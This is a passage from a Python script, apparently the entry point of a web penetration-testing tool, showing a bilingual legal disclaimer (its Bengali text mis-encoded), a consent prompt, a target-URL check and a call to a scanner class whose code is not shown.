# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MAIN EXECUTION
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    print(f"""
{Colors.CYAN}{'â•' * 80}
                    âš ï¸  LEGAL DISCLAIMER âš ï¸
                    à¦†à¦‡à¦¨à¦¿ à¦¦à¦¾à¦¬à¦¿à¦¤à§à¦¯à¦¾à¦—
{'â•' * 80}{Colors.ENDC}

{Colors.YELLOW}This tool is for AUTHORIZED security testing ONLY.
à¦à¦‡ à¦Ÿà§à¦²à¦Ÿà¦¿ à¦¶à§à¦§à§à¦®à¦¾à¦¤à§à¦° à¦…à¦¨à§à¦®à§‹à¦¦à¦¿à¦¤ à¦¸à¦¿à¦•à¦¿à¦‰à¦°à¦¿à¦Ÿà¦¿ à¦Ÿà§‡à¦¸à§à¦Ÿà¦¿à¦‚à¦¯à¦¼à§‡à¦° à¦œà¦¨à§à¦¯à¥¤

â€¢ Only test systems you own or have explicit permission to test
â€¢ Unauthorized testing is ILLEGAL
â€¢ The authors are not responsible for misuse

à¦¶à§à¦§à§à¦®à¦¾à¦¤à§à¦° à¦†à¦ªà¦¨à¦¾à¦° à¦¨à¦¿à¦œà¦¸à§à¦¬ à¦¸à¦¿à¦¸à§à¦Ÿà§‡à¦® à¦¬à¦¾ à¦…à¦¨à§à¦®à¦¤à¦¿à¦ªà§à¦°à¦¾à¦ªà§à¦¤ à¦¸à¦¿à¦¸à§à¦Ÿà§‡à¦® à¦Ÿà§‡à¦¸à§à¦Ÿ à¦•à¦°à§à¦¨à¥¤
à¦…à¦¨à¦¨à§à¦®à§‹à¦¦à¦¿à¦¤ à¦Ÿà§‡à¦¸à§à¦Ÿà¦¿à¦‚ à¦…à¦¬à§ˆà¦§à¥¤{Colors.ENDC}

{Colors.CYAN}{'â•' * 80}{Colors.ENDC}
    """)
    
    response = input(f"{Colors.BOLD}Do you understand and agree? (yes/no): {Colors.ENDC}").strip().lower()
    
    if response != 'yes':
        print(f"{Colors.RED}Scan aborted.{Colors.ENDC}")
        return
    
    print(f"\n{Colors.GREEN}[+] Starting penetration test...{Colors.ENDC}\n")
    
    # Validate target
    if not CONFIG['TARGET'] or CONFIG['TARGET'] == "https://example.com":
        print(f"{Colors.RED}[!] ERROR: Please set TARGET_URL at the top of the script{Colors.ENDC}")
        print(f"{Colors.YELLOW}[!] à¦•à§‹à¦¡à§‡à¦° à¦‰à¦ªà¦°à§‡ TARGET_URL à¦¸à§‡à¦Ÿ à¦•à¦°à§à¦¨{Colors.ENDC}")
        return
    
    # Initialize and run scanner
    scanner = AdvancedPenetrationTester(CONFIG)
    scanner.run()

if __name__ == "__main__":
    main()
